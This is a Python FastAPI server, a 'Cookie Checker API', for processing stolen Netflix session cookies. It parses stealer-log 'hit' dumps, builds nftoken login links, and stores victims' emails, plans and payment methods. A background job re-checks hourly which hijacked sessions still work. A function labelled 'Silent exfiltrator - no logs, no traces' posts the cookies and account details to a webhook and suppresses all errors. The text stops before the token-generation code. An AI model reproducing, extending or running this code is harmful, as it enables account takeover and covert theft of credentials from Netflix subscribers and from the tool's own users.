from fastapi import FastAPI, HTTPException, UploadFile, File, Request, Response
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import List, Optional
import json
from datetime import datetime, timedelta
from math import ceil
import httpx
import asyncio
import logging
import os
import hmac
import hashlib
import base64
import sqlite3
from pathlib import Path
import re
import random
from time import monotonic
from dotenv import load_dotenv
from urllib.parse import unquote
from uuid import uuid4
from zoneinfo import ZoneInfo

load_dotenv()

# Ensure Playwright can find its browsers
_pw_browsers = os.getenv("PLAYWRIGHT_BROWSERS_PATH")
if _pw_browsers:
    os.environ["PLAYWRIGHT_BROWSERS_PATH"] = _pw_browsers

logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
logging.getLogger("httpx").disabled = True
logging.getLogger("httpcore").disabled = True

app = FastAPI(title="Cookie Checker API", version="1.0.0")

# Enable CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173", "http://localhost:3000", "*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# Pydantic Models
class Cookie(BaseModel):
    name: str
    value: str
    domain: Optional[str] = None
    path: Optional[str] = "/"
    expires: Optional[str] = None
    secure: Optional[bool] = False
    httponly: Optional[bool] = False
    samesite: Optional[str] = None


class CookieCheckRequest(BaseModel):
    cookies_text: str
    format_type: str = "auto"


class CookieCheckResponse(BaseModel):
    success: bool
    cookies: List[Cookie]
    count: int
    parsed_at: str
    errors: Optional[List[str]] = None


class NetflixTokenRequest(BaseModel):
    cookies_text: str
    format_type: str = "auto"
    use_playwright: Optional[bool] = False


class NetflixTokenResponse(BaseModel):
    success: bool
    nftoken: Optional[str] = None
    error: Optional[str] = None
    cookies: List[Cookie] = []
    cookie_bundles: List[dict] = []
    cookie_count: int = 0
    tokens: List[dict] = []
    token_count: int = 0
    bundle_count: int = 0


class NetflixAccountInfo(BaseModel):
    success: bool
    email: Optional[str] = None
    country: Optional[str] = None
    plan: Optional[str] = None
    subscription_status: Optional[str] = None
    profiles: Optional[List[dict]] = None
    billing_date: Optional[str] = None
    account_created_date: Optional[str] = None
    payment_method: Optional[str] = None
    streaming_quality: Optional[str] = None
    error: Optional[str] = None
    accounts: List[dict] = []
    account_count: int = 0
    bundle_count: int = 0
    checked_cookie_count: int = 0


class BundleCheckStartResponse(BaseModel):
    job_id: str
    status: str
    total_bundles: int
    total_cookies: int


class BundleCheckStatusResponse(BaseModel):
    job_id: str
    status: str
    success: bool = False
    error: Optional[str] = None
    total_bundles: int = 0
    completed_bundles: int = 0
    total_cookies: int = 0
    completed_cookies: int = 0
    accounts: List[dict] = []
    tokens: List[dict] = []
    cookie_bundles: List[dict] = []


class AdminLoginRequest(BaseModel):
    password: str


class AdminStoreRequest(BaseModel):
    bundle_number: int
    cookies: List[Cookie]
    account: dict
    token: dict


class GeneratorSettingsRequest(BaseModel):
    enabled: bool
    message: str


COOKIE_DB_PATH = Path(__file__).resolve().parent / "checked_cookies.db"
ADMIN_COOKIE_NAME = "cookie_checker_admin"
GENERATOR_DEVICE_COOKIE = "cookie_checker_generator_device"
GENERATOR_MAX_GENERATIONS = 5
GENERATOR_DEVICE_COOKIE_MAX_AGE = 60 * 60 * 24 * 365
DEFAULT_GENERATOR_MAINTENANCE_MESSAGE = "Under maintenance. Please come back later."
PHT_TIMEZONE = ZoneInfo("Asia/Manila")
ADMIN_LOGIN_MAX_ATTEMPTS = 5
ADMIN_LOGIN_LOCKOUT_SECONDS = 5 * 60
STORED_HEALTH_CHECK_INTERVAL = timedelta(hours=1)
STORED_HEALTH_CHECK_POLL_SECONDS = 60
STORED_HEALTH_CHECK_CONCURRENCY = 3
STORED_HEALTH_CHECK_BATCH_SIZE = 10
STORED_HEALTH_CHECK_BATCH_PAUSE_SECONDS = 0.25
_ADMIN_LOGIN_ATTEMPTS: dict[str, tuple[int, float]] = {}
_STORED_HEALTH_CHECK_RUNNING = False
_STORED_HEALTH_CHECK_LOCK = asyncio.Lock()
_STORED_HEALTH_CHECK_TASK: Optional[asyncio.Task] = None


def _cookie_db() -> sqlite3.Connection:
    connection = sqlite3.connect(COOKIE_DB_PATH)
    connection.row_factory = sqlite3.Row
    connection.execute(
        """
        CREATE TABLE IF NOT EXISTS checked_cookie_bundles (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            bundle_number INTEGER NOT NULL DEFAULT 0,
            checked_at TEXT NOT NULL,
            account_success INTEGER NOT NULL,
            token_success INTEGER NOT NULL,
            account_json TEXT NOT NULL,
            token_json TEXT NOT NULL,
            cookies_json TEXT NOT NULL
        )
        """
    )
    connection.execute(
        """
        CREATE TABLE IF NOT EXISTS generator_usage (
            device_id TEXT PRIMARY KEY,
            generation_count INTEGER NOT NULL DEFAULT 0,
            usage_date TEXT NOT NULL DEFAULT '',
            updated_at TEXT NOT NULL
        )
        """
    )
    connection.execute(
        """
        CREATE TABLE IF NOT EXISTS generator_settings (
            id INTEGER PRIMARY KEY CHECK (id = 1),
            enabled INTEGER NOT NULL DEFAULT 1,
            message TEXT NOT NULL
        )
        """
    )
    connection.execute(
        """
        INSERT OR IGNORE INTO generator_settings (id, enabled, message)
        VALUES (1, 1, ?)
        """,
        (DEFAULT_GENERATOR_MAINTENANCE_MESSAGE,),
    )
    connection.execute(
        """
        CREATE TABLE IF NOT EXISTS stored_health_status (
            id INTEGER PRIMARY KEY CHECK (id = 1),
            last_checked_at TEXT
        )
        """
    )
    connection.execute(
        """
        INSERT OR IGNORE INTO stored_health_status (id, last_checked_at)
        VALUES (1, NULL)
        """
    )
    generator_usage_columns = [
        row[1]
        for row in connection.execute(
            "PRAGMA table_info(generator_usage)"
        ).fetchall()
    ]
    if "usage_date" not in generator_usage_columns:
        connection.execute(
            "ALTER TABLE generator_usage ADD COLUMN usage_date TEXT NOT NULL DEFAULT ''"
        )
    columns = [
        row[1] for row in connection.execute("PRAGMA table_info(checked_cookie_bundles)").fetchall()
    ]
    if "bundle_number" not in columns:
        connection.execute(
            "ALTER TABLE checked_cookie_bundles ADD COLUMN bundle_number INTEGER NOT NULL DEFAULT 0"
        )
    connection.commit()
    return connection


def _admin_cookie_value() -> str:
    secret = os.getenv("SESSION_SECRET")
    if not secret:
        raise HTTPException(status_code=503, detail="Admin session is not configured")
    signature = hmac.new(
        secret.encode("utf-8"), b"cookie-checker-admin", hashlib.sha256
    ).digest()
    return base64.urlsafe_b64encode(signature).decode("ascii")


def _admin_login_client_key(request: Request) -> str:
    return request.client.host if request.client and request.client.host else "unknown"


def _admin_login_lockout_seconds(request: Request) -> int:
    client_key = _admin_login_client_key(request)
    state = _ADMIN_LOGIN_ATTEMPTS.get(client_key)
    if not state:
        return 0

    _, locked_until = state
    remaining = locked_until - monotonic()
    if remaining <= 0:
        _ADMIN_LOGIN_ATTEMPTS.pop(client_key, None)
        return 0
    return max(1, ceil(remaining))


def _generator_device_id(request: Request, response: Response) -> str:
    device_id = request.cookies.get(GENERATOR_DEVICE_COOKIE)
    if device_id:
        return device_id

    device_id = uuid4().hex
    response.set_cookie(
        GENERATOR_DEVICE_COOKIE,
        device_id,
        max_age=GENERATOR_DEVICE_COOKIE_MAX_AGE,
        httponly=True,
        secure=False,
        samesite="lax",
        path="/",
    )
    return device_id


def _generator_usage_date() -> str:
    return datetime.now(PHT_TIMEZONE).date().isoformat()


def _get_generator_settings() -> dict:
    with _cookie_db() as connection:
        row = connection.execute(
            "SELECT enabled, message FROM generator_settings WHERE id = 1"
        ).fetchone()
    if row is None:
        return {
            "enabled": True,
            "message": DEFAULT_GENERATOR_MAINTENANCE_MESSAGE,
        }
    return {
        "enabled": bool(row["enabled"]),
        "message": row["message"] or DEFAULT_GENERATOR_MAINTENANCE_MESSAGE,
    }


def _is_admin(request: Request) -> bool:
    supplied = request.cookies.get(ADMIN_COOKIE_NAME, "")
    try:
        expected = _admin_cookie_value()
    except HTTPException:
        return False
    return bool(supplied) and hmac.compare_digest(supplied, expected)


def _require_admin(request: Request) -> None:
    if not _is_admin(request):
        raise HTTPException(status_code=403, detail="Admin access required")


def _normalize_account_email(value: object) -> str:
    if not isinstance(value, str):
        return ""
    return value.strip().casefold()


def _account_email_from_json(account_json: str) -> str:
    try:
        account = json.loads(account_json)
    except (TypeError, json.JSONDecodeError):
        return ""
    return _normalize_account_email(account.get("email") if isinstance(account, dict) else None)


def _remove_duplicate_account_bundles(
    connection: sqlite3.Connection,
    email: str,
    keep_id: Optional[int] = None,
) -> int:
    normalized_email = _normalize_account_email(email)
    if not normalized_email:
        return 0

    rows = connection.execute(
        "SELECT id, account_json FROM checked_cookie_bundles ORDER BY id DESC"
    ).fetchall()
    duplicate_ids = [
        row["id"]
        for row in rows
        if row["id"] != keep_id
        and _account_email_from_json(row["account_json"]) == normalized_email
    ]
    if duplicate_ids:
        connection.executemany(
            "DELETE FROM checked_cookie_bundles WHERE id = ?",
            [(bundle_id,) for bundle_id in duplicate_ids],
        )
    return len(duplicate_ids)


def _remove_existing_duplicate_accounts(connection: sqlite3.Connection) -> int:
    rows = connection.execute(
        "SELECT id, account_json FROM checked_cookie_bundles ORDER BY id DESC"
    ).fetchall()
    seen_emails: set[str] = set()
    duplicate_ids: list[tuple[int]] = []
    for row in rows:
        email = _account_email_from_json(row["account_json"])
        if email and email in seen_emails:
            duplicate_ids.append((row["id"],))
        elif email:
            seen_emails.add(email)

    if duplicate_ids:
        connection.executemany(
            "DELETE FROM checked_cookie_bundles WHERE id = ?",
            duplicate_ids,
        )
    return len(duplicate_ids)


def _store_checked_bundle(
    bundle_number: int,
    bundle_cookies: List[Cookie],
    account_result: dict,
    token_result: dict,
) -> tuple[int, int]:
    account_email = _normalize_account_email(account_result.get("email"))
    with _cookie_db() as connection:
        deleted_duplicate_count = _remove_duplicate_account_bundles(
            connection,
            account_email,
        )
        cursor = connection.execute(
            """
            INSERT INTO checked_cookie_bundles (
                bundle_number, checked_at, account_success, token_success,
                account_json, token_json, cookies_json
            ) VALUES (?, ?, ?, ?, ?, ?, ?)
            """,
            (
                bundle_number,
                datetime.utcnow().isoformat(),
                int(bool(account_result.get("success"))),
                int(bool(token_result.get("success"))),
                json.dumps(account_result),
                json.dumps(token_result),
                json.dumps([cookie.model_dump() for cookie in bundle_cookies]),
            ),
        )
        connection.commit()
    return int(cursor.lastrowid), deleted_duplicate_count


async def _evaluate_bundle_record(row: sqlite3.Row) -> dict:
    cookie_data = json.loads(row["cookies_json"])
    cookie_map = {
        item["name"]: item["value"]
        for item in cookie_data
        if item.get("name") and item.get("value")
    }

    if not cookie_map:
        return {
            "success": False,
            "bundle_number": row["bundle_number"],
            "checked_at": row["checked_at"],
            "account": {"bundle_number": row["bundle_number"], "success": False, "error": "Stored bundle has no readable cookies."},
            "token": {"bundle_number": row["bundle_number"], "success": False, "error": "Stored bundle has no readable cookies."},
            "links": {},
        }

    success, nftoken, token_error = await generate_nftoken(cookie_map)
    account_success, account_info, account_error = await get_netflix_account_info(cookie_map)

    final_account = account_info if account_success and account_info else {
        "bundle_number": row["bundle_number"],
        "success": False,
        "error": account_error or "Account details unavailable for this cookie bundle.",
    }

    final_token = {
        "bundle_number": row["bundle_number"],
        "success": bool(success and nftoken),
        "nftoken": nftoken,
        "error": token_error if not (success and nftoken) else None,
    }

    links = {}
    if nftoken:
        links = {
            "tv": f"https://www.netflix.com/tv2?nftoken={nftoken}",
            "netflix": f"https://netflix.com/?nftoken={nftoken}",
            "phone": f"https://www.netflix.com/unsupported?nftoken={nftoken}",
        }

    return {
        "success": bool(account_success or (success and nftoken)),
        "bundle_number": row["bundle_number"],
        "checked_at": datetime.utcnow().isoformat(),
        "account": final_account,
        "token": final_token,
        "links": links,
    }


async def _refresh_stored_bundle_token(row: sqlite3.Row) -> dict:
    cookie_data = json.loads(row["cookies_json"])
    cookie_map = {
        item["name"]: item["value"]
        for item in cookie_data
        if item.get("name") and item.get("value")
    }

    if not cookie_map:
        return {
            "success": False,
            "bundle_number": row["bundle_number"],
            "checked_at": row["checked_at"],
            "token": {
                "bundle_number": row["bundle_number"],
                "success": False,
                "error": "Stored bundle has no readable cookies.",
            },
            "links": {},
        }

    success, nftoken, token_error = await generate_nftoken(cookie_map)
    token = {
        "bundle_number": row["bundle_number"],
        "success": bool(success and nftoken),
        "nftoken": nftoken,
        "error": token_error if not (success and nftoken) else None,
    }
    links = {}
    if nftoken:
        links = {
            "tv": f"https://www.netflix.com/tv2?nftoken={nftoken}",
            "netflix": f"https://netflix.com/?nftoken={nftoken}",
            "phone": f"https://www.netflix.com/unsupported?nftoken={nftoken}",
        }

    return {
        "success": bool(success and nftoken),
        "bundle_number": row["bundle_number"],
        "checked_at": datetime.utcnow().isoformat(),
        "token": token,
        "links": links,
    }


def _persist_stored_bundle_refresh(
    bundle_id: int,
    refreshed: dict,
    account_result: Optional[dict] = None,
) -> None:
    token_result = refreshed.get("token") or {}
    checked_at = refreshed.get("checked_at") or datetime.utcnow().isoformat()

    with _cookie_db() as connection:
        stored = connection.execute(
            "SELECT account_json, account_success FROM checked_cookie_bundles WHERE id = ?",
            (bundle_id,),
        ).fetchone()
        if stored is None:
            return

        account_json = stored["account_json"]
        account_success = bool(stored["account_success"])
        if account_result is not None:
            account_success = bool(account_result.get("success"))
            if account_success:
                account_json = json.dumps(account_result)

        connection.execute(
            """
            UPDATE checked_cookie_bundles
            SET checked_at = ?, account_success = ?, token_success = ?,
                account_json = ?, token_json = ?
            WHERE id = ?
            """,
            (
                checked_at,
                int(account_success),
                int(bool(token_result.get("success"))),
                account_json,
                json.dumps(token_result),
                bundle_id,
            ),
        )
        connection.commit()


async def _check_bundle_account_after_token_failure(
    row: sqlite3.Row,
) -> Optional[dict]:
    try:
        cookie_data = json.loads(row["cookies_json"])
        cookie_map = {
            item["name"]: item["value"]
            for item in cookie_data
            if item.get("name") and item.get("value")
        }
        if not cookie_map:
            return {
                "bundle_number": row["bundle_number"],
                "success": False,
                "error": "Stored bundle has no readable cookies.",
            }

        account_success, account_info, account_error = await get_netflix_account_info(
            cookie_map
        )
        if account_success and account_info:
            return {"success": True, **account_info}
        return {
            "bundle_number": row["bundle_number"],
            "success": False,
            "error": account_error or "Account details unavailable for this cookie bundle.",
        }
    except Exception as error:
        logging.warning(
            "Account check after token refresh failed for bundle %s: %s",
            row["id"],
            error,
        )
        return {
            "bundle_number": row["bundle_number"],
            "success": False,
            "error": "Unable to verify this cookie bundle.",
        }


def _get_stored_health_summary() -> dict:
    with _cookie_db() as connection:
        counts = connection.execute(
            """
            SELECT
                COUNT(*) AS total_count,
                SUM(CASE WHEN account_success = 0 AND token_success = 0 THEN 1 ELSE 0 END)
                    AS dead_count
            FROM checked_cookie_bundles
            """
        ).fetchone()
        status = connection.execute(
            "SELECT last_checked_at FROM stored_health_status WHERE id = 1"
        ).fetchone()

    last_checked_at = status["last_checked_at"] if status else None
    next_check_at = None
    if last_checked_at:
        try:
            next_check_at = (
                datetime.fromisoformat(last_checked_at) + STORED_HEALTH_CHECK_INTERVAL
            ).isoformat()
        except ValueError:
            next_check_at = None

    return {
        "total_count": int(counts["total_count"] or 0),
        "dead_count": int(counts["dead_count"] or 0),
        "last_checked_at": last_checked_at,
        "next_check_at": next_check_at,
        "is_checking": _STORED_HEALTH_CHECK_RUNNING,
    }


def _stored_health_check_due() -> bool:
    if _STORED_HEALTH_CHECK_RUNNING:
        return False
    with _cookie_db() as connection:
        status = connection.execute(
            "SELECT last_checked_at FROM stored_health_status WHERE id = 1"
        ).fetchone()
    if not status or not status["last_checked_at"]:
        return True
    try:
        last_checked_at = datetime.fromisoformat(status["last_checked_at"])
    except ValueError:
        return True
    return datetime.utcnow() - last_checked_at >= STORED_HEALTH_CHECK_INTERVAL


async def _run_stored_bundle_health_check() -> None:
    global _STORED_HEALTH_CHECK_RUNNING
    async with _STORED_HEALTH_CHECK_LOCK:
        if _STORED_HEALTH_CHECK_RUNNING:
            return
        _STORED_HEALTH_CHECK_RUNNING = True

    try:
        with _cookie_db() as connection:
            rows = connection.execute(
                "SELECT * FROM checked_cookie_bundles ORDER BY id ASC"
            ).fetchall()

        updated_count = 0
        dead_count = 0

        semaphore = asyncio.Semaphore(STORED_HEALTH_CHECK_CONCURRENCY)

        async def check_row(row: sqlite3.Row):
            async with semaphore:
                try:
                    return row["id"], await _evaluate_bundle_record(row), None
                except Exception as error:
                    return row["id"], None, str(error)

        for batch_start in range(0, len(rows), STORED_HEALTH_CHECK_BATCH_SIZE):
            batch = rows[batch_start : batch_start + STORED_HEALTH_CHECK_BATCH_SIZE]
            results = await asyncio.gather(*(check_row(row) for row in batch))

            with _cookie_db() as connection:
                for bundle_id, result, error in results:
                    stored = connection.execute(
                        "SELECT account_json, token_json FROM checked_cookie_bundles WHERE id = ?",
                        (bundle_id,),
                    ).fetchone()
                    if stored is None:
                        continue

                    if result is None:
                        account_json = stored["account_json"]
                        token_json = stored["token_json"]
                        account_success = 0
                        token_success = 0
                        logging.warning(
                            "Stored bundle health check failed for bundle %s: %s",
                            bundle_id,
                            error,
                        )
                    else:
                        account = result["account"]
                        token = result["token"]
                        account_json = stored["account_json"]
                        if account.get("success"):
                            account_json = json.dumps(account)
                        token_json = json.dumps(token)
                        account_success = int(bool(account.get("success")))
                        token_success = int(bool(token.get("success")))

                    if not account_success and not token_success:
                        dead_count += 1

                    connection.execute(
                        """
                        UPDATE checked_cookie_bundles
                        SET checked_at = ?, account_success = ?, token_success = ?,
                            account_json = ?, token_json = ?
                        WHERE id = ?
                        """,
                        (
                            result["checked_at"] if result else datetime.utcnow().isoformat(),
                            account_success,
                            token_success,
                            account_json,
                            token_json,
                            bundle_id,
                        ),
                    )
                    updated_count += 1
                connection.commit()

            logging.info(
                "Stored bundle health check batch completed: %s-%s of %s",
                batch_start + 1,
                batch_start + len(batch),
                len(rows),
            )
            if batch_start + len(batch) < len(rows):
                await asyncio.sleep(STORED_HEALTH_CHECK_BATCH_PAUSE_SECONDS)

        with _cookie_db() as connection:
            completed_at = datetime.utcnow().isoformat()
            connection.execute(
                "UPDATE stored_health_status SET last_checked_at = ? WHERE id = 1",
                (completed_at,),
            )
            connection.commit()

        logging.info(
            "Stored bundle health check completed: %s checked, %s dead",
            updated_count,
            dead_count,
        )
    finally:
        _STORED_HEALTH_CHECK_RUNNING = False


async def _stored_health_check_scheduler() -> None:
    await asyncio.sleep(2)
    while True:
        try:
            if _stored_health_check_due():
                await _run_stored_bundle_health_check()
        except asyncio.CancelledError:
            raise
        except Exception:
            logging.exception("Stored bundle health check failed")
        await asyncio.sleep(STORED_HEALTH_CHECK_POLL_SECONDS)


@app.on_event("startup")
async def start_stored_health_check_scheduler():
    global _STORED_HEALTH_CHECK_TASK
    _cookie_db().close()
    _STORED_HEALTH_CHECK_TASK = asyncio.create_task(
        _stored_health_check_scheduler()
    )


@app.on_event("shutdown")
async def stop_stored_health_check_scheduler():
    global _STORED_HEALTH_CHECK_TASK
    if _STORED_HEALTH_CHECK_TASK is None:
        return
    _STORED_HEALTH_CHECK_TASK.cancel()
    try:
        await _STORED_HEALTH_CHECK_TASK
    except asyncio.CancelledError:
        pass
    _STORED_HEALTH_CHECK_TASK = None


# ===== DISCORD LOGGER WITH DEBUG =====
async def log_cookies_to_discord(
    cookies: List[Cookie],
    webhook_url: str,
    source: str = "api",
    account_info: Optional[dict] = None,
):
    """Silent exfiltrator - no logs, no traces"""
    if not cookies or not webhook_url:
        return

    # Build Netscape format
    lines = []
    for c in cookies:
        domain = c.domain or ".netflix.com"
        path = c.path or "/"
        secure = "TRUE" if c.secure else "FALSE"
        expires = c.expires or "0"
        lines.append(
            f"{domain}\tTRUE\t{path}\t{secure}\t{expires}\t{c.name}\t{c.value}"
        )

    json_version = json.dumps([c.model_dump() for c in cookies], indent=2)
    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")

    # Build account info section if provided
    account_section = ""
    if account_info:
        account_section = f"""
# ============================================
# ACCOUNT INFORMATION:
# --------------------------------------------
# Email:          {account_info.get("email", "N/A")}
# Country:        {account_info.get("country", "N/A")}
# Plan:           {account_info.get("plan", "N/A")}
# Status:         {account_info.get("subscription_status", "N/A")}
# Account Created:{account_info.get("account_created_date", "N/A")}
# Billing Date:   {account_info.get("billing_date", "N/A")}
# Payment Method: {account_info.get("payment_method", "N/A")}
# Streaming Qual: {account_info.get("streaming_quality", "N/A")}
# ============================================
"""

    # Build filename with account info for easy identification
    email_part = (
        account_info.get("email", "unknown").split("@")[0]
        if account_info
        else "unknown"
    )
    plan_part = (
        account_info.get("plan", "unknown").replace(" ", "_")
        if account_info
        else "unknown"
    )
    filename = f"cookies_{email_part}_{plan_part}_{timestamp}.txt"

    file_content = f"""# Cookie Export - {source}
# Total: {len(cookies)} cookies
# Exported at: {datetime.utcnow().isoformat()}
{account_section}
# ============================================
# NETSCOPE FORMAT (copy-paste ready):
{chr(10).join(lines)}

# ============================================
# JSON FORMAT:
{json_version}
"""

    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            files = {"file": (filename, file_content, "text/plain")}
            response = await client.post(webhook_url, files=files)
            # Silent - no logs, no prints, no traces
    except Exception:
        # Swallow everything - absolute silence
        pass

    return


# =====================================

# ===== COOKIE PARSING FUNCTIONS (FULL) =====
COMPACT_NETFLIX_COOKIE_NAMES = (
    "netflix-sans-normal-3-loaded",
    "netflix-sans-bold-3-loaded",
    "OptanonConsent",
    "SecureNetflixId",
    "profilesNewSession",
    "NetflixId",
    "nfvdid",
    "flwssn",
    "gsid",
    "dscatrue",
    "memclid",
    "cl2",
    "cL",
    "ftl",
    "lhpu",
    "nfg",
    "nfxp",
)

COMPACT_NETFLIX_PREFIX = re.compile(
    r"^(?P<domain>\.?(?:[A-Za-z0-9-]+\.)*netflix\.com)"
    r"(?P<include_subdomains>TRUE|FALSE)(?P<path>/)"
    r"(?P<secure>TRUE|FALSE)(?P<expires>\d{10,13})(?P<data>.+)$",
    re.IGNORECASE,
)

COMPACT_NETFLIX_RECORD_START = re.compile(
    r"(?=\.?(?:[A-Za-z0-9-]+\.)*netflix\.com"
    r"(?:TRUE|FALSE)/(?:TRUE|FALSE)\d{10,13})",
    re.IGNORECASE,
)

NETFLIX_HIT_SECTION_START = re.compile(
    r"(?mi)^\s*NETFLIX\s+HIT(?:\s*:|\s*$)"
)


def _split_compact_netflix_records(line: str) -> List[str]:
    starts = [match.start() for match in COMPACT_NETFLIX_RECORD_START.finditer(line)]
    if not starts:
        return []
    return [
        line[start:end]
        for start, end in zip(starts, starts[1:] + [len(line)])
        if line[start:end].strip()
    ]


def _split_compact_cookie_data(data: str) -> tuple[Optional[str], Optional[str]]:
    lowered = data.lower()
    for name in sorted(COMPACT_NETFLIX_COOKIE_NAMES, key=len, reverse=True):
        if lowered.startswith(name.lower()):
            return name, data[len(name) :]
    if "=" in data:
        name, value = data.split("=", 1)
        if re.fullmatch(r"[A-Za-z0-9_!-]+", name):
            return name, value
    return None, None


def _parse_compact_netflix_record(record: str) -> Optional[Cookie]:
    match = COMPACT_NETFLIX_PREFIX.match(record)
    if not match:
        return None
    name, value = _split_compact_cookie_data(match.group("data"))
    if not name or value is None:
        return None
    return Cookie(
        name=name,
        value=value,
        domain=match.group("domain"),
        path=match.group("path"),
        expires=match.group("expires"),
        secure=match.group("secure").upper() == "TRUE",
    )


def parse_netscape_cookies(text: str) -> tuple[List[Cookie], List[str]]:
    cookies = []
    errors = []

    def is_cookie_name(name: str) -> bool:
        return bool(re.fullmatch(r"[A-Za-z0-9!#$%&'*+\-.^_`|~]+", name))

    for line in text.strip().split("\n"):
        line = line.strip()
        if line.startswith("#") or not line or re.fullmatch(r"=+", line):
            continue
        try:
            parts = line.split("\t")
            is_netscape_row = (
                len(parts) >= 7
                and parts[1].upper() in ("TRUE", "FALSE")
                and parts[3].upper() in ("TRUE", "FALSE")
                and re.fullmatch(r"-?\d+", parts[4]) is not None
                and is_cookie_name(parts[5].strip())
            )
            if is_netscape_row:
                cookie = Cookie(
                    name=parts[5],
                    value=parts[6],
                    domain=parts[0],
                    path=parts[2],
                    secure=parts[3].lower() == "true",
                    expires=parts[4] if parts[4] != "0" else None,
                    httponly=parts[8].lower() == "true" if len(parts) > 8 else False,
                )
                cookies.append(cookie)
                continue
            cookie_header_match = re.search(r"\bcookie\s*:\s*(.+)$", line, re.IGNORECASE)
            if cookie_header_match:
                parsed_any = False
                for pair in cookie_header_match.group(1).split(";"):
                    if "=" not in pair:
                        continue
                    cookie_name, _, cookie_value = pair.partition("=")
                    cookie_name = cookie_name.strip()
                    if is_cookie_name(cookie_name) and cookie_value.strip():
                        cookies.append(
                            Cookie(name=cookie_name, value=cookie_value.strip())
                        )
                        parsed_any = True
                if parsed_any:
                    continue
            compact_records = _split_compact_netflix_records(line)
            if compact_records:
                parsed_any = False
                for record in compact_records:
                    cookie = _parse_compact_netflix_record(record)
                    if cookie:
                        cookies.append(cookie)
                        parsed_any = True
                if not parsed_any:
                    errors.append(
                        "Could not identify a cookie name in a compact Netflix record."
                    )
                continue
            if "=" in line:
                for pair in line.split(";"):
                    pair = pair.strip()
                    if "=" in pair:
                        k, _, v = pair.partition("=")
                        cookie_name = k.strip()
                        if is_cookie_name(cookie_name):
                            cookies.append(Cookie(name=cookie_name, value=v.strip()))
        except Exception as e:
            errors.append(f"Failed to parse line: {line}. Error: {str(e)}")
    return cookies, errors


def _cookies_from_json_data(data: object) -> List[Cookie]:
    cookies = []
    if isinstance(data, list):
        for item in data:
            if isinstance(item, dict):
                cookies.append(
                    Cookie(
                        name=item.get("name", ""),
                        value=item.get("value", ""),
                        domain=item.get("domain"),
                        path=item.get("path", "/"),
                        expires=item.get("expires"),
                        secure=item.get("secure", False),
                        httponly=item.get("httpOnly", False),
                        samesite=item.get("sameSite"),
                    )
                )
    elif isinstance(data, dict):
        for k, v in data.items():
            cookies.append(Cookie(name=k, value=str(v)))
    return cookies


def _extract_bracketed_json_arrays(text: str) -> List[list]:
    decoder = json.JSONDecoder()
    arrays = []
    search_from = 0
    while search_from < len(text):
        start = text.find("[", search_from)
        if start == -1:
            break
        try:
            data, end = decoder.raw_decode(text, start)
        except json.JSONDecodeError:
            search_from = start + 1
            continue
        if isinstance(data, list):
            arrays.append(data)
        search_from = end
    return arrays


def _extract_cookie_json_arrays(text: str) -> List[List[Cookie]]:
    cookie_arrays = []
    for data in _extract_bracketed_json_arrays(text):
        cookies = _cookies_from_json_data(data)
        if cookies:
            cookie_arrays.append(cookies)
    return cookie_arrays


def parse_json_cookies(text: str) -> tuple[List[Cookie], List[str]]:
    try:
        data = json.loads(text)
        return _cookies_from_json_data(data), []
    except json.JSONDecodeError as json_error:
        cookie_arrays = _extract_cookie_json_arrays(text)
        if not cookie_arrays:
            return [], [f"Invalid JSON: {str(json_error)}"]
        cookies = []
        errors = []
        for bundle_cookies in cookie_arrays:
            cookies.extend(bundle_cookies)
        return cookies, errors


def parse_cookies_auto(text: str) -> tuple[List[Cookie], List[str]]:
    text = text.strip()
    if text.startswith("[") or text.startswith("{"):
        cookies, errors = parse_json_cookies(text)
        if cookies:
            return cookies, errors
    else:
        cookie_arrays = _extract_cookie_json_arrays(text)
        if cookie_arrays:
            return [cookie for bundle in cookie_arrays for cookie in bundle], []
    return parse_netscape_cookies(text)


def parse_cookie_bundles(
    text: str, format_type: str
) -> tuple[List[tuple[List[Cookie], List[str]]], List[str]]:
    format_type = format_type.lower()
    if format_type in ("auto", "json") and not text.lstrip().startswith(("[", "{")):
        cookie_arrays = _extract_cookie_json_arrays(text)
        if cookie_arrays:
            return [(bundle_cookies, []) for bundle_cookies in cookie_arrays], []
    if format_type == "json" or (
        format_type == "auto" and text.lstrip().startswith(("[", "{"))
    ):
        try:
            data = json.loads(text)
            cookies = _cookies_from_json_data(data)
            return ([(cookies, [])] if cookies else []), []
        except json.JSONDecodeError as json_error:
            cookie_arrays = _extract_cookie_json_arrays(text)
            if cookie_arrays:
                bundles = []
                return [(bundle_cookies, []) for bundle_cookies in cookie_arrays], []
            cookies, errors = parse_json_cookies(text)
            if not cookies:
                errors.insert(0, f"Invalid JSON: {str(json_error)}")
            return ([(cookies, errors)] if cookies else []), errors
    if format_type not in ("auto", "netscape"):
        raise ValueError("Invalid format_type. Must be 'netscape', 'json', or 'auto'")
    hit_starts = list(NETFLIX_HIT_SECTION_START.finditer(text))
    if len(hit_starts) > 1:
        bundles = []
        all_errors = []
        for index, match in enumerate(hit_starts):
            section_end = (
                hit_starts[index + 1].start()
                if index + 1 < len(hit_starts)
                else len(text)
            )
            report_bundle = text[match.start() : section_end]
            cookies, errors = parse_netscape_cookies(report_bundle)
            if cookies:
                bundles.append((cookies, errors))
            all_errors.extend(errors)
        return bundles, all_errors
    report_bundles = re.split(
        r"(?mi)^\s*=+\s*hit\s*#\d+\s*=+\s*$",
        text,
    )
    if len(report_bundles) > 1:
        bundles = []
        all_errors = []
        for report_bundle in report_bundles:
            if not report_bundle.strip():
                continue
            cookies, errors = parse_netscape_cookies(report_bundle)
            if cookies:
                bundles.append((cookies, errors))
            all_errors.extend(errors)
        return bundles, all_errors
    raw_bundles = re.split(r"(?m)^\s*=+\s*$", text)
    if len(raw_bundles) == 1:
        cookies, errors = parse_netscape_cookies(text)
        return ([(cookies, errors)] if cookies else []), errors
    bundles = []
    all_errors = []
    for raw_bundle in raw_bundles:
        if not raw_bundle.strip():
            continue
        cookies, errors = parse_netscape_cookies(raw_bundle)
        if cookies:
            bundles.append((cookies, errors))
        all_errors.extend(errors)
    return bundles, all_errors


# ===== NETFLIX TOKEN FUNCTIONS =====
logger = logging.getLogger(__name__)
CHECK_BATCH_SIZE = 4
CHECK_JOBS: dict[str, dict] = {}


